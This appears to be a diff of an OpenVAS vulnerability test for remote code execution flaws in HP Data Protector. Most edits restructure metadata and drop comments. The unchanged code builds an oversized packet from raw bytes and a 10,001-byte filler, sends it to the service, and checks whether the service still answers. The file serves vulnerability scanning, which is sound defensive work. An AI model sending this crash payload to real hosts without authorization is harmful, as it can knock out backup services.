@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_hp_data_protector_mult_code_exec_vuln.nasl 7203 2017-09-20 13:01:39Z cfischer $
+# $Id: secpod_hp_data_protector_mult_code_exec_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # HP (OpenView Storage) Data Protector Multiple Remote Code Execution Vulnerabilities
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:hp:data_protector";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902454");
-  script_version("$Revision: 7203 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-20 15:01:39 +0200 (Wed, 20 Sep 2017) $");
+  script_version("$Revision: 11421 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -48,36 +48,20 @@ if(description)
   script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/552");
   script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/551");
 
-  tag_solution = "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
+  arbitrary   code and lead to denial of service conditions.");
 
-  A Workaround is to apply below mentioned steps,
+  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector 6.20 and prior.");
 
-  1. Upgrade to HP (OpenView Storage) Data Protector A.06.20 or subsequent.
+  script_tag(name:"insight", value:"Multiple flaws are due to error in 'data protector inet' service,
+  command. which allows remote remote attackers to execute arbitrary code.");
 
-  2. Enable encrypted control communication services on cell server
-  and all clients in cell.";
+  script_tag(name:"summary", value:"This host is installed with HP (OpenView Storage) Data Protector and is prone to
+  multiple remote code execution vulnerabilities.");
 
-  tag_impact = "Successful exploitation will allow remote attackers to execute
-  arbitrary   code and lead to denial of service conditions.
-
-  Impact Level: Application.";
-
-  tag_affected = "HP (OpenView Storage) Data Protector 6.20 and prior.";
-
-  tag_insight = "Multiple flaws are due to error in 'data protector inet' service,
-  command. which allows remote remote attackers to execute arbitrary code.";
-
-  tag_summary = "This host is installed with HP (OpenView Storage) Data Protector and is prone to
-  multiple remote code execution vulnerabilities.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"solution", value:tag_solution);
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -93,7 +77,6 @@ get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to th
 soc = open_sock_tcp( port );
 if( ! soc ) exit( 0 );
 
-## Construct attack string (header)
 headdata = raw_string( 0x00, 0x00, 0x27, 0xca, 0xff, 0xfe, 0x32,
                  0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                  0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
@@ -102,10 +85,8 @@ headdata = raw_string( 0x00, 0x00, 0x27, 0xca, 0xff, 0xfe, 0x32,
                  0x00, 0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x00,
                  0x00, 0x20, 0x00 );
 
-## Construct attack string (actuall data to be send)
 middata = crap( data:raw_string( 0x61 ), length:10001 );
 
-## Construct attack string (post data)
 lastdata = raw_string( 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                  0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                  0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
@@ -127,12 +108,10 @@ lastdata = raw_string( 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
 
 req = headdata + middata + lastdata;
 
-## send the data
 send( socket:soc, data:req );
 
 close( soc );
 
-## wait for 5 sec
 sleep( 5 );
 
 soc = open_sock_tcp( port );
